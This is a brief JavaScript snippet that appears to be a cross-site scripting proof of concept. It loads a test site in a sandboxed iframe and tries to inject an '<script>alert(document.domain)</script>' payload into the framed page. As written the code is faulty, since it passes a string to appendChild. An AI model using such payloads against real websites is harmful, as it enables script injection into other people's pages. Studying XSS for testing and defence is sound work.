var aFrame = document.createElement('iframe');
aFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-modals');
aFrame.setAttribute('src', 'https://wacky.buggywebsite.com/')
document.body.appendChild(aFrame);
xss = "<script>alert(document.domain)</script>";
aFrame.contentDocument.body.appendChild(xss);

